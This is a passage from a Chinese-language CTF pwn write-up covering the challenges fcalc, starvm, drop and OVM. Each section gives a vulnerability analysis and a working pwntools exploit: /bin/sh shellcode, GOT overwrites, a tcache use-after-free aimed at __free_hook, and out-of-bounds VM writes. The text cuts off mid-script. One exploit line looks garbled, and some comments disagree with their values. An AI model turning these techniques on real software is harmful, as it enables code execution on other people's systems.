class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是要利用的部分,40e0存储着栈地址,通过字符’0’可以触发进入40e0指向的内存</p><p>综上程序要正常工作要输入类似</p><p><code>3.14 6.18+</code>才会进行工作,数字之间通过空格分隔,多个数字也只取最后两个</p><p><strong>利用:</strong></p><p>首先要满足条件dword_4010 &lt;= 1,即有两个或以上操作数</p><p>还要绕过检测所有非空数值符合条件 (v13 &lt; 1.0 || v13 &gt; 100.0)</p><p>但其实只检测从s起始的,buf中的并没有检测</p><p>所以shellcode我们只需要<strong>写在buf中就能绕过检测了</strong></p><p>但是代码执行是从rbp+0x50的位置开始,所以需要在该处写一个跳转指令jmp $-0x40</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./fcalc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">b&#x27;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.send( <span class="string">b&#x27;2 2 0&#x27;</span>.ljust(<span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + shellcode.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(<span class="number">0x3ff000000000beeb</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>跳转指令也要绕过检测,结合double储存的知识,0x3ff000000000beeb会被认为是一个很小的但有刚好大于1的数</p><p>或者价格NaN头也行</p><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>vm类题</p><p>checksec,没有PIE利用会稍微简单一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/starvm&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>代码有点难读,gdb动态调试参照</p><p>初始malloc申请了0x80的内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0h   *code_begin</span><br><span class="line">8h   *code_end</span><br><span class="line">...  ??</span><br><span class="line">24h  *cost</span><br><span class="line">...  ??</span><br><span class="line">38h  regs(Dword)</span><br><span class="line">...</span><br><span class="line">70h  mem</span><br></pre></td></tr></table></figure><p>程序在读入command和cost后做出一些判断,然后进入虚拟机操作中</p><p>存在两个重要的变量分别负责指向当前code和当前cost</p><p>10号功能给寄存器赋值,溢出可以修改后面的mem指针</p><p>7号指令可以往mem指向处任意写,两者配合其他指令</p><p><strong>具体实施:</strong></p><ol><li>10号指令覆写mem指针为setvbuf的got表地址,利用减法得到system,利用7号指令将其修改</li><li>10号指令覆写mem指针为malloc的got表地址,7号指令将其写为调用setvbuf的地址</li><li>10号指令覆写mem指针为stdin的地址,将其修改为bss段上另一处地址,并在该处写上sh字符串</li><li>10号指令覆写mem指针为0使得再次调用相关功能时启用malloc,总而执行以上布置的执行流</li></ol><p>要注意指令是4字节Dword的,下标要对应</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10   setvbuf@got</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6    #mem[0]-&gt;reg[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30b90</span>, <span class="comment"># 10  根据libc修改</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3     reg[0]-=reg[1]</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7      mem[0]=reg[0]</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10  malloc@got</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x401270</span>, <span class="comment"># 10   trigger  setvbuf</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7   mem[0]&lt;-reg[1]</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7   mem[1]&lt;-reg[2]清空malloc高地址</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10   &amp;stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10  save &#x27;sh&#x27;</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10  &#x27;sh&#x27;</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mem[0]&lt;-reg[0]  </span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7    mem[1]&lt;-reg[2]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7    mem[2]&lt;-reg[1]</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10   clear mem</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6      trigger malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/drop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida反编译后需要做比较困难的逆向工作,看wp出题者似乎希望用户在动态调试中查找漏洞的</p><p>源代码是Rust语言写的,看得很懵不懂是如何调用malloc和free的</p><p>程序要利用得地方在于bubble排序时候,通过比较字符串进行大小判断再排序,排序的时候存在不规范的free导致产生UAF</p><p>先泄露libc再利用UAF修改tache的next去写__free_hook</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">rl  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">inter   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./drop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./drop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: \n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;item: \n&#x27;</span>, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: \n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: \n&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;content: \n&#x27;</span>, data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: \n&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">magic</span>(<span class="params">n, idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice: \n&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;is East)\n&#x27;</span>, <span class="built_in">str</span>(n))</span><br><span class="line">    sla(<span class="string">b&#x27;index: \n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;\x04&#x27;</span>*<span class="number">0x300</span>) <span class="comment">#index 0</span></span><br><span class="line">add(<span class="string">b&#x27;\x03&#x27;</span>*<span class="number">0x500</span>) <span class="comment">#index 1</span></span><br><span class="line">add(<span class="string">b&#x27;\x01&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#index 2</span></span><br><span class="line">magic(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_base = l64() - <span class="number">0x70</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system, binsh = get_sb()</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;\x04&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#index 3</span></span><br><span class="line">add(<span class="string">b&#x27;\x03&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#index 4</span></span><br><span class="line">add(<span class="string">b&#x27;\x05&#x27;</span>*<span class="number">0x100</span>) <span class="comment">#index 5</span></span><br><span class="line">magic(<span class="number">1</span>, <span class="number">3</span>)malloc(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, p64(free_hook - <span class="number">8</span>) + p64(<span class="number">0</span>))</span><br><span class="line">debug()</span><br><span class="line">add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(payload)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>, libc_base)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h1 id="任务Ⅱ"><a href="#任务Ⅱ" class="headerlink" title="任务Ⅱ"></a>任务Ⅱ</h1><p>VM Pwn就是题目自定义了一套指令系统，并且模拟了一套CPU的环境（寄存器、栈、数据缓冲区等结构）需要通过逆向分析题目给定的指令系统,并利用其中的漏洞进行攻击</p><p>大部分漏洞都是<strong><u>数组越界</u></strong>!!</p><p>分析的时候要结合全局分析,先把总体架构搞清楚,如果只看部分很容易懵逼</p><h2 id="OVM"><a href="#OVM" class="headerlink" title="OVM"></a>OVM</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>比较入门的一道vm类题目了</p><p>通过一个数组模拟寄存器</p><p>程序实现了加减乘除左移右移压栈弹栈等操作</p><p>可以自己输入指令起始地址,指令数,栈起始等</p><p>程序的指令都是四字节的</p><p>字节从高到低分别是:指令码,左操作数,右操作数1,右操作数2</p><p>循环主体,不断取出指令下标并判断执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( running )</span><br><span class="line"> &#123;</span><br><span class="line">   v7 = fetch();</span><br><span class="line">   execute(v7);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>利用的漏洞自然是指令没有对下标进行检查,能够覆写很多地方</p><p>在接收到结束指令后会打印所有寄存器的值,此时可以进行泄露</p><p>由于开启了FULL RELRO,因此选择覆写__free_hook</p><p>具体的利用步骤:</p><ol><li>将got表中存储的libc相关地址分块存储到寄存器中,建议泄露stdin三个,距离__free_hook比较近</li><li>通过got表计算得到__free_hook-8的地址(不同libc不同偏移,要根据gdb调试判断)</li><li>覆写comment指针为__free_hook-8</li><li>向comment指针写入binsh字符串,并覆写__free_hook为system的地址</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;pwn&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = reg[v2] + reg[v3]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">v4, v3, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x70</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = reg[v3] &lt;&lt; reg[v2]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_shift</span>(<span class="params">v4, v3, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0xc0</span>)+p8(v4)+p8(v3)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#reg[v4] = memory[reg[v2]]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x30</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#memory[reg[v2]] = reg[v4]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x40</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># reg[v4] = (unsigned __int8)v2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setnum</span>(<span class="params">v4, v2</span>):</span><br><span class="line">    <span class="keyword">return</span> u32((p8(<span class="number">0x10</span>)+p8(v4)+p8(<span class="number">0</span>)+p8(v2))[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = [</span><br><span class="line">    setnum(<span class="number">0</span>, <span class="number">8</span>),  <span class="comment"># reg[0]=8</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0xff</span>),  <span class="comment"># reg[1]=0xff</span></span><br><span class="line">    setnum(<span class="number">2</span>, <span class="number">0xff</span>),  <span class="comment"># reg[2]=0xff</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),  <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xff&lt;&lt;8=0xff00)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xff00+0xff=0xffff)</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),  <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffff&lt;&lt;8=0xffff00)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xffff00+0xff=0xffffff)</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0xc8</span>),  <span class="comment"># reg[1]=0xc8</span></span><br><span class="line">    <span class="comment"># reg[2]=reg[2]&lt;&lt;reg[0](reg[2]=0xffffff&lt;&lt;8=0xffffff00)</span></span><br><span class="line">    left_shift(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="comment"># reg[2]=reg[2]+reg[1](reg[2]=0xffffff00+0xc8=0xffffffc8=-56)</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),</span><br><span class="line">    read(<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># reg[3]=memory[reg[2]]=memory[-56]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># reg[1]=1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+reg[1]=-56+1=-55</span></span><br><span class="line">    read(<span class="number">4</span>, <span class="number">2</span>),  <span class="comment"># reg[4]=memory[reg[2]]=memory[-55]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">0x16</span>),  <span class="comment"># reg[1]=0x10</span></span><br><span class="line">    left_shift(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>),  <span class="comment"># reg[1]=reg[1]&lt;&lt;8=0x10&lt;&lt;8=0x1000</span></span><br><span class="line">    setnum(<span class="number">0</span>, <span class="number">0xb0</span>),  <span class="comment"># reg[0]=0x90</span></span><br><span class="line">    <span class="comment"># reg[1]=reg[1]+reh[0]=0x1000+0x90=0x1090 &amp;free_hook-8-&amp;stdin=0x1090</span></span><br><span class="line">    add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>),  <span class="comment"># reg[3]=reg[3]+reg[1]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">47</span>),  <span class="comment"># reg[1]=47</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+2=-55+47=-8</span></span><br><span class="line">    write(<span class="number">3</span>, <span class="number">2</span>),  <span class="comment"># memory[reg[2]]=memory[-8]=reg[3]</span></span><br><span class="line">    setnum(<span class="number">1</span>, <span class="number">1</span>),  <span class="comment"># reg[1]=1</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>),  <span class="comment"># reg[2]=reg[2]+1=-8+1=-7</span></span><br><span class="line">    write(<span class="number">4</span>, <span class="number">2</span>),  <span class="comment"># memory[reg[2]]=memory[-7]=reg[4]</span></span><br><span class="line">    u32((p8(<span class="number">0xff</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>))[::-<span class="number">1</span>])  <span class="comment"># exit</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;PC: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span 